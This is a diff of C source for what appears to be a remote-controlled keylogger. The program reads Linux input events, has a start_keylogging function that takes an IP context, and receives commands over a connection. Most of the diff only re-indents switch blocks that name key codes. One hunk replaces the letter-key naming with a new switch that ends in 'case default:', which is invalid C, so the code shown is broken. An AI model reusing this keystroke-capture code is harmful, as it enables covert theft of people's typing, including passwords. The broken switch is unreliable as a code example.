@@ -84,7 +84,7 @@
 
 static volatile sig_atomic_t g_running = 1;
 
-static void *receive_thread(void *arg)
+static void                 *receive_thread(void *arg)
 {
     receiver_args_t *args   = (receiver_args_t *)arg;
     char            *output = NULL;
@@ -1009,29 +1009,29 @@ static void update_modifiers(int code, int value)
 
     switch (code)
     {
-        case KEY_LEFTSHIFT:
-        case KEY_RIGHTSHIFT:
-            modifiers.shift = pressed;
-            break;
-        case KEY_LEFTCTRL:
-        case KEY_RIGHTCTRL:
-            modifiers.ctrl = pressed;
-            break;
-        case KEY_LEFTALT:
-        case KEY_RIGHTALT:
-            modifiers.alt = pressed;
-            break;
-        case KEY_LEFTMETA:
-        case KEY_RIGHTMETA:
-            modifiers.meta = pressed;
-            break;
-        case KEY_CAPSLOCK:
-            // Capslock is a toggle - only change on press
-            if (value == 1)
-            {
-                modifiers.capslock = !modifiers.capslock;
-            }
-            break;
+    case KEY_LEFTSHIFT:
+    case KEY_RIGHTSHIFT:
+        modifiers.shift = pressed;
+        break;
+    case KEY_LEFTCTRL:
+    case KEY_RIGHTCTRL:
+        modifiers.ctrl = pressed;
+        break;
+    case KEY_LEFTALT:
+    case KEY_RIGHTALT:
+        modifiers.alt = pressed;
+        break;
+    case KEY_LEFTMETA:
+    case KEY_RIGHTMETA:
+        modifiers.meta = pressed;
+        break;
+    case KEY_CAPSLOCK:
+        // Capslock is a toggle - only change on press
+        if (value == 1)
+        {
+            modifiers.capslock = !modifiers.capslock;
+        }
+        break;
     }
 }
 
@@ -1114,21 +1114,21 @@ static const char *event_type_to_string(int type)
 {
     switch (type)
     {
-        case EV_SYN: return "EV_SYN";
-        case EV_KEY: return "EV_KEY";
-        case EV_REL: return "EV_REL";
-        case EV_ABS: return "EV_ABS";
-        case EV_MSC: return "EV_MSC";
-        case EV_SW: return "EV_SW";
-        case EV_LED: return "EV_LED";
-        case EV_SND: return "EV_SND";
-        case EV_REP: return "EV_REP";
-        default:
-        {
-            static char buf[32];
-            snprintf(buf, sizeof(buf), "TYPE_%d", type);
-            return buf;
-        }
+    case EV_SYN: return "EV_SYN";
+    case EV_KEY: return "EV_KEY";
+    case EV_REL: return "EV_REL";
+    case EV_ABS: return "EV_ABS";
+    case EV_MSC: return "EV_MSC";
+    case EV_SW: return "EV_SW";
+    case EV_LED: return "EV_LED";
+    case EV_SND: return "EV_SND";
+    case EV_REP: return "EV_REP";
+    default:
+    {
+        static char buf[32];
+        snprintf(buf, sizeof(buf), "TYPE_%d", type);
+        return buf;
+    }
     }
 }
 
@@ -1141,13 +1141,13 @@ static const char *code_to_string_buf(int type, int code, char *buf, size_t bufl
     {
         switch (code)
         {
-            case SYN_REPORT: return "SYN_REPORT";
-            case SYN_CONFIG: return "SYN_CONFIG";
-            case SYN_MT_REPORT: return "SYN_MT_REPORT";
-            case SYN_DROPPED: return "SYN_DROPPED";
-            default:
-                snprintf(buf, buflen, "SYN_%d", code);
-                return buf;
+        case SYN_REPORT: return "SYN_REPORT";
+        case SYN_CONFIG: return "SYN_CONFIG";
+        case SYN_MT_REPORT: return "SYN_MT_REPORT";
+        case SYN_DROPPED: return "SYN_DROPPED";
+        default:
+            snprintf(buf, buflen, "SYN_%d", code);
+            return buf;
         }
     }
 
@@ -1155,15 +1155,15 @@ static const char *code_to_string_buf(int type, int code, char *buf, size_t bufl
     {
         switch (code)
         {
-            case MSC_SCAN: return "MSC_SCAN";
-            case MSC_SERIAL: return "MSC_SERIAL";
-            case MSC_PULSELED: return "MSC_PULSELED";
-            case MSC_GESTURE: return "MSC_GESTURE";
-            case MSC_RAW: return "MSC_RAW";
-            case MSC_TIMESTAMP: return "MSC_TIMESTAMP";
-            default:
-                snprintf(buf, buflen, "MSC_%d", code);
-                return buf;
+        case MSC_SCAN: return "MSC_SCAN";
+        case MSC_SERIAL: return "MSC_SERIAL";
+        case MSC_PULSELED: return "MSC_PULSELED";
+        case MSC_GESTURE: return "MSC_GESTURE";
+        case MSC_RAW: return "MSC_RAW";
+        case MSC_TIMESTAMP: return "MSC_TIMESTAMP";
+        default:
+            snprintf(buf, buflen, "MSC_%d", code);
+            return buf;
         }
     }
 
@@ -1172,41 +1172,41 @@ static const char *code_to_string_buf(int type, int code, char *buf, size_t bufl
         // CHECK SPECIAL KEYS FIRST
         switch (code)
         {
-            case KEY_ESC: return "KEY_ESC";
-            case KEY_ENTER: return "KEY_ENTER";
-            case KEY_BACKSPACE: return "KEY_BACKSPACE";
-            case KEY_TAB: return "KEY_TAB";
-            case KEY_SPACE: return "KEY_SPACE";
-            case KEY_MINUS: return "KEY_MINUS";
-            case KEY_EQUAL: return "KEY_EQUAL";
-            case KEY_LEFTBRACE: return "KEY_LEFTBRACE";
-            case KEY_RIGHTBRACE: return "KEY_RIGHTBRACE";
-            case KEY_SEMICOLON: return "KEY_SEMICOLON";
-            case KEY_APOSTROPHE: return "KEY_APOSTROPHE";
-            case KEY_GRAVE: return "KEY_GRAVE";
-            case KEY_BACKSLASH: return "KEY_BACKSLASH";
-            case KEY_COMMA: return "KEY_COMMA";
-            case KEY_DOT: return "KEY_DOT";
-            case KEY_SLASH: return "KEY_SLASH";
-            case KEY_CAPSLOCK: return "KEY_CAPSLOCK";
-            case KEY_LEFTSHIFT: return "KEY_LEFTSHIFT";
-            case KEY_RIGHTSHIFT: return "KEY_RIGHTSHIFT";
-            case KEY_LEFTCTRL: return "KEY_LEFTCTRL";
-            case KEY_RIGHTCTRL: return "KEY_RIGHTCTRL";
-            case KEY_LEFTALT: return "KEY_LEFTALT";
-            case KEY_RIGHTALT: return "KEY_RIGHTALT";
-            case KEY_LEFTMETA: return "KEY_LEFTMETA";
-            case KEY_RIGHTMETA: return "KEY_RIGHTMETA";
-            case KEY_UP: return "KEY_UP";
-            case KEY_DOWN: return "KEY_DOWN";
-            case KEY_LEFT: return "KEY_LEFT";
-            case KEY_RIGHT: return "KEY_RIGHT";
-            case KEY_PAGEUP: return "KEY_PAGEUP";
-            case KEY_PAGEDOWN: return "KEY_PAGEDOWN";
-            case KEY_HOME: return "KEY_HOME";
-            case KEY_END: return "KEY_END";
-            case KEY_INSERT: return "KEY_INSERT";
-            case KEY_DELETE: return "KEY_DELETE";
+        case KEY_ESC: return "KEY_ESC";
+        case KEY_ENTER: return "KEY_ENTER";
+        case KEY_BACKSPACE: return "KEY_BACKSPACE";
+        case KEY_TAB: return "KEY_TAB";
+        case KEY_SPACE: return "KEY_SPACE";
+        case KEY_MINUS: return "KEY_MINUS";
+        case KEY_EQUAL: return "KEY_EQUAL";
+        case KEY_LEFTBRACE: return "KEY_LEFTBRACE";
+        case KEY_RIGHTBRACE: return "KEY_RIGHTBRACE";
+        case KEY_SEMICOLON: return "KEY_SEMICOLON";
+        case KEY_APOSTROPHE: return "KEY_APOSTROPHE";
+        case KEY_GRAVE: return "KEY_GRAVE";
+        case KEY_BACKSLASH: return "KEY_BACKSLASH";
+        case KEY_COMMA: return "KEY_COMMA";
+        case KEY_DOT: return "KEY_DOT";
+        case KEY_SLASH: return "KEY_SLASH";
+        case KEY_CAPSLOCK: return "KEY_CAPSLOCK";
+        case KEY_LEFTSHIFT: return "KEY_LEFTSHIFT";
+        case KEY_RIGHTSHIFT: return "KEY_RIGHTSHIFT";
+        case KEY_LEFTCTRL: return "KEY_LEFTCTRL";
+        case KEY_RIGHTCTRL: return "KEY_RIGHTCTRL";
+        case KEY_LEFTALT: return "KEY_LEFTALT";
+        case KEY_RIGHTALT: return "KEY_RIGHTALT";
+        case KEY_LEFTMETA: return "KEY_LEFTMETA";
+        case KEY_RIGHTMETA: return "KEY_RIGHTMETA";
+        case KEY_UP: return "KEY_UP";
+        case KEY_DOWN: return "KEY_DOWN";
+        case KEY_LEFT: return "KEY_LEFT";
+        case KEY_RIGHT: return "KEY_RIGHT";
+        case KEY_PAGEUP: return "KEY_PAGEUP";
+        case KEY_PAGEDOWN: return "KEY_PAGEDOWN";
+        case KEY_HOME: return "KEY_HOME";
+        case KEY_END: return "KEY_END";
+        case KEY_INSERT: return "KEY_INSERT";
+        case KEY_DELETE: return "KEY_DELETE";
         }
 
         // Function keys
@@ -1217,11 +1217,11 @@ static const char *code_to_string_buf(int type, int code, char *buf, size_t bufl
         }
 
         // Letters
-        if (code >= KEY_A && code <= KEY_Z)
-        {
-            snprintf(buf, buflen, "KEY_%c", 'A' + (code - KEY_A));
-            return buf;
-        }
+        // if (code >= KEY_A && code <= KEY_Z)
+        // {
+        //     snprintf(buf, buflen, "KEY_%c", 'A' + (code - KEY_A));
+        //     return buf;
+        // }
 
         // Numbers
         if (code >= KEY_1 && code <= KEY_9)
@@ -1232,7 +1232,144 @@ static const char *code_to_string_buf(int type, int code, char *buf, size_t bufl
         if (code == KEY_0)
             return "KEY_0";
 
-        snprintf(buf, buflen, "KEY_%d", code);
+        switch (code)
+        {
+        case KEY_A:
+        {
+            snprintf(buf, buflen, "CODE_A");
+            break;
+        }
+        case KEY_B:
+        {
+            snprintf(buf, buflen, "CODE_B");
+            break;
+        }
+        case KEY_C:
+        {
+            snprintf(buf, buflen, "CODE_C");
+            break;
+        }
+        case KEY_D:
+        {
+            snprintf(buf, buflen, "CODE_D");
+            break;
+        }
+        case KEY_E:
+        {
+            snprintf(buf, buflen, "CODE_E");
+            break;
+        }
+        case KEY_F:
+        {
+            snprintf(buf, buflen, "CODE_F");
+            break;
+        }
+        case KEY_G:
+        {
+            snprintf(buf, buflen, "CODE_G");
+            break;
+        }
+        case KEY_H:
+        {
+            snprintf(buf, buflen, "CODE_H");
+            break;
+        }
+        case KEY_I:
+        {
+            snprintf(buf, buflen, "CODE_I");
+            break;
+        }
+        case KEY_J:
+        {
+            snprintf(buf, buflen, "CODE_J");
+            break;
+        }
+        case KEY_K:
+        {
+            snprintf(buf, buflen, "CODE_K");
+            break;
+        }
+        case KEY_L:
+        {
+            snprintf(buf, buflen, "CODE_L");
+            break;
+        }
+        case KEY_M:
+        {
+            snprintf(buf, buflen, "CODE_M");
+            break;
+        }
+        case KEY_N:
+        {
+            snprintf(buf, buflen, "CODE_N");
+            break;
+        }
+        case KEY_O:
+        {
+            snprintf(buf, buflen, "CODE_O");
+            break;
+        }
+        case KEY_P:
+        {
+            snprintf(buf, buflen, "CODE_P");
+            break;
+        }
+        case KEY_Q:
+        {
+            snprintf(buf, buflen, "CODE_Q");
+            break;
+        }
+        case KEY_R:
+        {
+            snprintf(buf, buflen, "CODE_R");
+            break;
+        }
+        case KEY_S:
+        {
+            snprintf(buf, buflen, "CODE_S");
+            break;
+        }
+        case KEY_T:
+        {
+            snprintf(buf, buflen, "CODE_T");
+            break;
+        }
+        case KEY_U:
+        {
+            snprintf(buf, buflen, "CODE_U");
+            break;
+        }
+        case KEY_V:
+        {
+            snprintf(buf, buflen, "CODE_V");
+            break;
+        }
+        case KEY_W:
+        {
+            snprintf(buf, buflen, "CODE_W");
+            break;
+        }
+        case KEY_X:
+        {
+            snprintf(buf, buflen, "CODE_X");
+            break;
+        }
+        case KEY_Y:
+        {
+            snprintf(buf, buflen, "CODE_Y");
+            break;
+        }
+        case KEY_Z:
+        {
+            snprintf(buf, buflen, "CODE_Z");
+            break;
+        }
+        case default:
+        {
+            snprintf(buf, buflen, "KEY_%d", code);
+            break;
+        }
+        }
         return buf;
     }
 
@@ -1260,12 +1397,12 @@ static const char *value_to_string(int type, int code, int value)
     {
         switch (value)
         {
-            case 0: return "RELEASE";
-            case 1: return "PRESS";
-            case 2: return "REPEAT";
-            default:
-                snprintf(buf, sizeof(buf), "STATE_%d", value);
-                return buf;
+        case 0: return "RELEASE";
+        case 1: return "PRESS";
+        case 2: return "REPEAT";
+        default:
+            snprintf(buf, sizeof(buf), "STATE_%d", value);
+            return buf;
         }
     }
 
@@ -1434,7 +1571,7 @@ static void capture_keys(const char *device_path)
         tv.tv_sec  = 0;
         tv.tv_usec = 100000; // 100ms for responsive Ctrl+C
 
-        ret = select(fd + 1, &readfds, NULL, NULL, &tv);
+        ret        = select(fd + 1, &readfds, NULL, NULL, &tv);
 
         if (ret < 0)
         {
@@ -1483,7 +1620,7 @@ static void capture_keys(const char *device_path)
         if (ev.type == EV_KEY)
         {
             // Get scan code for fix only if valid and not already consumed
-            scan_for_fix = (last_scan_code_valid && !last_scan_consumed) ? last_scan_code : 0;
+            scan_for_fix   = (last_scan_code_valid && !last_scan_consumed) ? last_scan_code : 0;
 
             // Fix Parallels bugs
             corrected_code = fix_parallels_key_code(ev.code, scan_for_fix, &was_fixed);
@@ -1632,7 +1769,7 @@ int start_keylogging(ip_info ip_ctx)
     receive_string(ip_ctx, &output);
 
     char *end;
-    errno = 0;
+    errno       = 0;
 
     long choice = strtol(output, &end, 10);
 
